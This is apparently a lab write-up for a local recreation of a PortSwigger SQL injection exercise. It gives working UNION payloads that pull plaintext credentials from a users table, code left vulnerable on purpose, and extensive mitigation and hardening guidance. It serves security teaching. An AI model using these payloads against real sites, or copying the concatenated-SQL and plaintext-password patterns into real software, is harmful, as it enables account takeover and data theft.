# Lab 09 — SQL injection UNION attack, retrieving data from other tables

## 1. Lab overview

| Field | Value |
| --- | --- |
| PortSwigger reference | <https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-data-from-other-tables> |
| Lab id | `psw-sqli-09-union-retrieve-data` |
| Vulnerability class | SQL Injection — UNION-based data extraction across tables |
| CWE | [CWE-89 — Improper Neutralization of Special Elements used in an SQL Command](https://cwe.mitre.org/data/definitions/89.html) |
| Backend | SQLite (single-service Django app) |
| Host URL | <http://127.0.0.1:18009/> |
| Flag | `FLAG{psw-sqli-09-union-retrieve-admin-access}` |

### Objective

The product listing runs a two-column `SELECT name, description` behind the category filter. A separate `users` table stores cleartext credentials for `administrator`, `wiener`, and `carlos`. The attacker must graft a `UNION SELECT` onto the filter query to exfiltrate the `username` / `password` pairs, then use the recovered administrator credentials on the ordinary login form to reach `my-account` and reveal the flag.

---

## 2. Exploit walkthrough

Unlike lab 01, the flag is not sitting in the products table. It is gated behind a real login, so the injection has to reach into an *adjacent* table, pull text out of it, and surface it in the product listing. The `UNION` operator does exactly that, provided the two selects line up on column count and compatible types.

**Step 1 — confirm the column count with `ORDER BY`**

```http
GET /filter?category=Gifts'+ORDER+BY+2--+ HTTP/1.1
Host: 127.0.0.1:18009
```

`ORDER BY 2` succeeds. `ORDER BY 3` produces a database error (`1st ORDER BY term out of range`). The outer select therefore projects exactly two columns.

**Step 2 — verify both columns accept strings**

```http
GET /filter?category=Gifts'+UNION+SELECT+'a','b'--+ HTTP/1.1
Host: 127.0.0.1:18009
```

A row containing `a` and `b` joins the normal results. Both UNION slots accept text, which is what we need to smuggle `username` and `password` out.

**Step 3 — enumerate the other tables (optional)**

SQLite exposes its schema via `sqlite_master`:

```
/filter?category=Gifts'+UNION+SELECT+name,sql+FROM+sqlite_master--+
```

Confirms a `users` table with columns `id, username, password, is_admin`.

**Step 4 — extract credentials**

```http
GET /filter?category=Gifts'+UNION+SELECT+username,password+FROM+users--+ HTTP/1.1
Host: 127.0.0.1:18009
```

Final SQL (visible in the `Executed SQL` panel):

```sql
SELECT name, description
FROM products
WHERE category = 'Gifts' UNION SELECT username, password FROM users-- ' AND released = 1
```

The result set now includes three bonus rows — one per user — with the username in the `name` column and the plaintext password in the `description` column. The administrator password is a random 16-byte token seeded at container start.

**Step 5 — pivot to the login form**

```http
POST /login HTTP/1.1
Host: 127.0.0.1:18009
Content-Type: application/x-www-form-urlencoded

username=administrator&password=<recovered-token>
```

Login is intentionally parameterised, so it matches exactly against the row we just exfiltrated. The session cookie is now bound to an `is_admin=True` account, and `GET /my-account` renders the flag.

---

## 3. Vulnerable code

### Endpoint: `GET /filter`

[shop/views.py:52-61](shop/views.py#L52-L61)

```python
def filter_products(request: HttpRequest) -> HttpResponse:
    category = request.GET.get("category", "")

    # Two-column SELECT list. Both columns are text-typed so the
    # attacker can UNION arbitrary string pairs into them.
    query = (
        "SELECT name, description "
        "FROM products "
        "WHERE category = '" + category + "' AND released = 1"
    )
```

The defects compound what lab 01 already shows:

1. `category` is taken straight from `request.GET` and concatenated into the SQL string — the driver cannot tell code from data.
2. The outer `SELECT` projects two text-typed columns, so any `UNION SELECT <str>, <str>` rider is syntactically and type-wise valid.
3. The `released = 1` predicate follows the injection point, so `--` in the payload comments it out, and nothing inside the database constrains which tables a UNION can reach.

[shop/views.py:66-71](shop/views.py#L66-L71)

```python
    try:
        with connection.cursor() as cursor:
            cursor.execute(query)
            rows = cursor.fetchall()
    except Exception as exc:
        error = f"Database error: {exc}"
```

`cursor.execute(query)` is called with a single prebuilt string — no `params` list, so no binding. The `except` branch reflects the raw database error back to the template (useful for the `ORDER BY` column-count probe).

[shop/views.py:73-82](shop/views.py#L73-L82) — the response context deliberately leaks the composed SQL through `executed_sql`, which the filter template then renders inside a `<pre>` block ([shop/templates/shop/filter.html:11-13](shop/templates/shop/filter.html#L11-L13)).

### Credential-bearing table

[shop/models.py:18-32](shop/models.py#L18-L32) — `User.password` is a plain `CharField`. No hashing, no salting. The docstring spells out that this is intentional so the UNION extract is directly usable against the login form.

[shop/views.py:91-103](shop/views.py#L91-L103) — `login_view` uses `User.objects.filter(username=username, password=password)` via the ORM. This half is safe by design: the ORM always parameterises. The teaching point is that a single unsafe query elsewhere undoes every hardening decision made at the auth boundary.

### Flag gating

[shop/views.py:111-126](shop/views.py#L111-L126) — the flag is only rendered when the session is bound to a user whose `is_admin` flag is `True`. That forces the attacker through the full UNION-then-login chain.

### Seeded data

[shop/management/commands/seed.py:57-62](shop/management/commands/seed.py#L57-L62) — the administrator password is `secrets.token_urlsafe(16)`. Guessing or brute-forcing it is infeasible, so UNION extraction is the only viable path.

---

## 4. Why the vulnerability exists

| Root cause | Effect |
| --- | --- |
| **String concatenation of untrusted input into SQL** | `category` is spliced into the query, so quotes and comments rewrite the statement instead of matching literally. |
| **Column list and data types are externally probe-able** | A 2-column, text-typed projection makes `UNION SELECT username, password FROM users` a drop-in match. |
| **Cross-table reach of the database role** | The application's DB user can read `users` and `sqlite_master`, so UNION can range over every table in the database. |
| **Plaintext password storage** | The value extracted via UNION is directly usable at `/login`. Hashing would have blocked the pivot even after extraction. |
| **Verbose error surface** | The `except` branch echoes SQL errors to the page ([shop/views.py:70-71](shop/views.py#L70-L71)), turning the `ORDER BY` probe into a free column-count oracle. |
| **Debug reflection of executed SQL** (intentional for teaching) | [shop/templates/shop/filter.html:11-13](shop/templates/shop/filter.html#L11-L13) hands the learner the composed query; in production this is a schema-leaking gift to attackers. |

---

## 5. Code-level mitigation

### 5.1 Parameterise the query

Binding `category` severs the injection at its source. Attacker payloads become literal values matched against the `category` column.

```python
# shop/views.py — fixed
def filter_products(request: HttpRequest) -> HttpResponse:
    category = request.GET.get("category", "")

    query = (
        "SELECT name, description "
        "FROM products "
        "WHERE category = %s AND released = 1"
    )
    with connection.cursor() as cursor:
        cursor.execute(query, [category])   # positional binding
        rows = cursor.fetchall()
```

With binding in place, `Gifts' UNION SELECT username,password FROM users-- ` is treated as a single category name, nothing matches, and no UNION is ever parsed.

### 5.2 Use the ORM

The existing login handler already models the safe pattern:

```python
from .models import Product

def filter_products(request):
    category = request.GET.get("category", "")
    products = (
        Product.objects
        .filter(category=category, released=True)
        .values("name", "description")
    )
```

Django's query compiler parameterises every filter. There is no raw string to tamper with.

### 5.3 Hash passwords

Replace [shop/models.py:28](shop/models.py#L28) with a hashed column. Either use Django's built-in `AbstractBaseUser` / `set_password` / `check_password`, or a modern KDF directly (`argon2-cffi` is recommended):

```python
from argon2 import PasswordHasher

ph = PasswordHasher()

class User(models.Model):
    username = models.CharField(max_length=150, unique=True)
    password_hash = models.CharField(max_length=200)
    is_admin = models.BooleanField(default=False)

    def set_password(self, raw: str) -> None:
        self.password_hash = ph.hash(raw)

    def verify_password(self, raw: str) -> bool:
        try:
            return ph.verify(self.password_hash, raw)
        except Exception:
            return False
```

Even if a future SQL injection leaks the whole `users` table, the attacker has to break Argon2id before they can log in — effectively shutting the pivot.

### 5.4 Stop reflecting the executed SQL and raw error text

Remove the `executed_sql` context key from [shop/views.py:73-82](shop/views.py#L73-L82) and the `<pre class="sql">{{ executed_sql }}</pre>` block from [shop/templates/shop/filter.html:10-13](shop/templates/shop/filter.html#L10-L13). Replace the bare `except` with a logged server-side error and a generic 500 page so the column-count oracle goes dark.

### 5.5 Input validation

`category` is drawn from a known taxonomy. An allow-list check short-circuits all malformed input before it reaches the query layer:

```python
ALLOWED_CATEGORIES = {
    "Accessories", "Tech", "Lifestyle", "Gifts", "Pets", "Clothing",
}

def filter_products(request):
    category = request.GET.get("category", "")
    if category not in ALLOWED_CATEGORIES:
        return HttpResponseBadRequest("unknown category")
```

Validation is defense-in-depth. Parameterisation stops injection; validation stops malformed input from reaching the query layer at all.

### 5.6 Separate the "searchable" projection from the real table

If the product listing only ever exposes two columns, expose them through a dedicated view and have the app query the view. A stray future bug cannot then UNION into unrelated tables through that endpoint's role:

```sql
CREATE VIEW public_product_catalog AS
SELECT name, description FROM products WHERE released = 1;
```

The application's DB user is granted `SELECT` on `public_product_catalog` only — no direct access to `products` or `users`.

---

## 6. Network / infrastructure-level mitigation

### 6.1 Web Application Firewall (WAF)

Deploy a WAF with the OWASP Core Rule Set in front of the app:

- `REQUEST-942` — SQL injection detection (flags `UNION SELECT`, `ORDER BY n`, `'--`, `sqlite_master`, `information_schema`).
- `REQUEST-920` — protocol hardening (rejects oversized / malformed query strings).
- Paranoia level 2+ trips on numeric `ORDER BY` probes and inline SQL comments.

A WAF is a supplement, not a fix. Treat it as one layer.

### 6.2 Least-privilege database role

Grant the application account only what it needs:

- `SELECT` on `products` (or better, the `public_product_catalog` view in 5.6).
- No access to `users` from the product-listing role; authentication runs under a distinct role that can read `users` but is never reachable from `/filter`.
- No `DDL` (`CREATE`, `ALTER`, `DROP`), no `ATTACH DATABASE`, no `PRAGMA` that enables file I/O.
- For SQLite specifically, open the database in read-only mode from the catalog context (`file:shop.db?mode=ro`). UNION extraction still returns data, but write-side pivots (stacked queries, `INSERT`, `UPDATE`) are impossible.

### 6.3 Password storage hygiene

Even setting aside the injection, the plaintext `User.password` column is a critical finding in its own right:

- Passwords must be hashed with a slow, memory-hard KDF (Argon2id, scrypt, or bcrypt with a modern cost parameter).
- Include a per-row random salt (all three listed KDFs do this by default).
- Rotate the hashing parameters periodically and re-hash on next login when parameters are upgraded.
- Never store, log, or transmit the cleartext after the first login event.

Applied here, the UNION payload would still return the `password_hash` column, but the recovered hash cannot be replayed at `/login` without offline cracking. That single change downgrades this lab from "full admin takeover" to "offline dictionary attack with unknown success rate".

### 6.4 Network segmentation

- The DB tier must not be reachable from the internet. For this lab `docker-compose.yml:10` binds the web container to `127.0.0.1:18009` only — the DB file is internal to the container.
- In a production equivalent, put the RDBMS on a private subnet with no egress route, so even post-exploitation it cannot phone home via `COPY PROGRAM`, `xp_cmdshell`, or DNS exfiltration.
- Container images should run as a non-root user, so a hypothetical file-read primitive (`readfile()` on MySQL, `pg_read_file` on Postgres) is further contained.

### 6.5 Monitoring and rate limiting

- Log every database exception and every response whose row count exceeds a sane ceiling for the endpoint. A sudden `/filter` response containing credential-shaped strings is a strong incident signal.
- Rate-limit `/filter` per client IP; automated column-count probes and UNION fuzzers are noisy and benefit from per-IP throttling.
- Add detection for repeated 4xx/5xx from `/login` that follow a `/filter` burst from the same IP — that is the attack chain's signature.

### 6.6 Session and auth hardening

- Apply CSRF protection on `/login` (currently `@csrf_exempt` at [shop/views.py:85](shop/views.py#L85) for teaching convenience).
- Rate-limit authentication attempts and lock the administrator account after N failures with alerting.
- Require multi-factor authentication for administrator-level roles, so a stolen password on its own is insufficient.

---

## 7. Defense-in-depth checklist

- [ ] All SQL is parameterised or goes through the ORM — no `+`, `%`, or f-string query builders.
- [ ] Endpoint-level input validation (allow-list for enumerable fields such as `category`).
- [ ] Passwords stored with a memory-hard KDF (Argon2id / scrypt / bcrypt) plus per-row salt.
- [ ] Application DB role has the minimum grants needed; production and catalog roles separated.
- [ ] Sensitive tables (`users`, `flags`, `tokens`) are not reachable from product-listing contexts.
- [ ] Query errors are logged server-side, never reflected to the client.
- [ ] Composed SQL is never echoed in responses or templates.
- [ ] CSRF enforced on state-changing endpoints including `/login`.
- [ ] Rate limiting on `/filter` and `/login`; alerts on multi-step injection signatures.
- [ ] MFA for administrator accounts.
- [ ] SAST (`bandit`, `semgrep`) rules that flag `cursor.execute(f"...")`, `cursor.execute("..." + x)`, and plaintext password columns.
- [ ] WAF with OWASP CRS in front of the application as a supplementary layer.

---

## 8. References

- PortSwigger Web Security Academy — [SQL injection UNION attack, retrieving data from other tables](https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-data-from-other-tables)
- PortSwigger — [SQL injection UNION attacks (overview)](https://portswigger.net/web-security/sql-injection/union-attacks)
- OWASP — [SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
- OWASP — [Password Storage Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Password_Storage_Cheat_Sheet.html)
- CWE-89 — <https://cwe.mitre.org/data/definitions/89.html>
- CWE-256 — [Plaintext Storage of a Password](https://cwe.mitre.org/data/definitions/256.html)
- Django docs — [Executing custom SQL directly](https://docs.djangoproject.com/en/5.0/topics/db/sql/#executing-custom-sql-directly)
- OWASP CRS — <https://coreruleset.org/>
